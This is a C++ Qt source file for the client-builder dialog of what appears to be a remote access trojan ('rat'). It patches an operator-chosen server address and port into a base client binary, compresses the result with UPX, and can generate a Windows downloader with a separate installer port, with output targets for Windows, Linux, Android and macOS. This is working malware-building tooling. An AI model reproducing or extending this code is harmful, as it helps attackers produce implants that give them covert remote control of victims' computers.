#include "createclientdialog.h"

#include <QFileDialog>
#include <QHostAddress>
#include <QMessageBox>
#include <QNetworkInterface>
#include <QProcess>
#include <appsettings.h>
#include <functional>

QString CreateClientDialog::selectedPlatform() const
{
    if (radioButtonLinux->isChecked())
        return "linux";

    if (radioButtonWindows->isChecked())
        return "windows";

    if (radioButtonAndroid->isChecked())
        return "android";

    if (radioButtonMacos->isChecked())
        return "macos";

    return QString();
}

CreateClientDialog::CreateClientDialog(QWidget *parent) :
    QDialog(parent)
{
    setupUi(this);
//    auto v = new QRegularExpressionValidator(this);
//    v->setRegularExpression(QRegularExpression("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"));
//    lineEditServerAddress->setValidator(v);

#ifdef Q_OS_LINUX
#ifdef Q_OS_ANDROID
    radioButtonAndroid->setChecked(true);
#else
    radioButtonLinux->setChecked(true);
#endif
#endif
#ifdef Q_OS_WIN
    radioButtonWindows->setChecked(true);
#endif
#ifdef Q_OS_MAC
    radioButtonMacos->setChecked(true);
#endif

    const QHostAddress &localhost = QHostAddress(QHostAddress::LocalHost);
    for (const QHostAddress &address: QNetworkInterface::allAddresses()) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && address != localhost)
            comboBoxServerAddress->addItem(address.toString());
    }

    spinBoxPort->setValue(RatAppSettings->ratPort());
    spinBoxInstallerPort->setValue(RatAppSettings->installerPort());

    if (!AppSettings::supportsInstaller()) {
        spinBoxInstallerPort->hide();
        labelInstallerPort->hide();
    }
}

void CreateClientDialog::changeEvent(QEvent *e)
{
    QDialog::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        retranslateUi(this);
        break;
    default:
        break;
    }
}

void CreateClientDialog::compressUpx()
{
    QStringList args = QStringList()
        << "-9"
        << "-o" << lineEditOutput->text()
        << qApp->applicationDirPath().replace("/", "\\") + "\\builder\\windows\\Client.exe";
    QProcess p;
    p.setProgram("upx");
    p.setArguments(args);
    p.start();
    p.waitForFinished();
}

bool CreateClientDialog::createWindowsDownloader()
{
    QStringList args = QStringList()
            << "--input" << qApp->applicationDirPath().replace("/", "\\") + "\\builder\\windows\\Client.exe"
            << "--webport" << QString::number(spinBoxInstallerPort->value())
            << "--output" << lineEditOutput->text()
            << "--port" << QString::number(spinBoxPort->value())
            << "--server" << comboBoxServerAddress->currentText();
    QProcess p;
    p.setProgram(qApp->applicationDirPath() + "/builder/windows/ClientMaker.exe");
    p.setArguments(args);
    p.start();
    p.waitForFinished();
    auto buffer = p.readAllStandardOutput().toLower();
    qDebug() << buffer;
    if (p.exitCode())
        return false;
    return buffer.contains("*ok*");
}

bool CreateClientDialog::createClient()
{
    QByteArray content;
    auto replace_var = [&content](const QString &name, const QString &value) -> bool {
        QString searchTerm = "**" + name + "**";
        auto i = content.indexOf(searchTerm);
        if (i == -1)
            return false;

        auto closePos = content.indexOf("**", i);
        bool ok;
        auto len = content.mid(i + searchTerm.length(), closePos - i - searchTerm.length()).toInt(&ok);
        if (!ok)
            return false;

        content.remove(i, len);
        QByteArray extraSpaces(len - value.length(), ' ');
        content.insert(i, value.toLatin1() + extraSpaces);

        qDebug() << name << i;
        return true;
    };
    QString baseFile;
#ifdef QT_NO_DEBUG
    baseFile = QString("%1/builder/%2/base.dat")
                   .arg(qApp->applicationDirPath(), selectedPlatform());
#else
#   ifdef Q_OS_LINUX
      baseFile = "/doc/dev/Qt/build/rat/Desktop_Qt_5_14_0_GCC_64bit/Debug/client/client";
#   else
       baseFile = "D:/dev/Qt/rat/build/client/Qt_lite/Release/client.exe";
#   endif
#endif
      QFile f(baseFile);

    if (!f.open(QIODevice::ReadOnly))
        return false;

    content = f.readAll();
    f.close();

    replace_var("is_ready", "true");
    replace_var("server_address", comboBoxServerAddress->currentText());
    replace_var("port", QString::number(spinBoxPort->value()));

    QFile out(lineEditOutput->text());

    if (!out.open(QIODevice::WriteOnly))
        return false;

    out.write(content);
    out.close();
    return true;
}

void CreateClientDialog::on_pushButtonBuild_clicked()
{
    if (radioButtonByAddressAndPort->isChecked()) {
        if (comboBoxServerAddress->currentText().isEmpty()) {
            QMessageBox::warning(this, windowTitle(),
                                 tr("Server address is invalid"));
            return;
        }
    }
    if (lineEditOutput->text().isEmpty()) {
        QMessageBox::warning(this, windowTitle(),
                             tr("Please select output file path"));
        return;
    }

    bool ok = false;
    if (radioButtonWindows->isChecked())
        ok = createClient();

    if (ok)
        QMessageBox::information(this, windowTitle(),
                                 tr("Client was created successfully"));
    else
        QMessageBox::warning(this, windowTitle(),
                             tr("Client generation was fails"));
}

void CreateClientDialog::on_toolButtonBrowseOutput_clicked()
{
    QString filter;
    if (radioButtonLinux->isChecked())
        filter = "Bash script (*.sh)";

    if (radioButtonWindows->isChecked())
        filter = "Windows exe file (*.exe)";

    if (radioButtonAndroid->isChecked())
        filter = "Android package (*.apk)";

    if (radioButtonMacos->isChecked())
        filter = "Mas os package (*.pkg)";

    auto fn = QFileDialog::getSaveFileName(this, tr("Select output file"),
                                 QString(), filter);

    if (!fn.isEmpty())
        lineEditOutput->setText(fn);
}
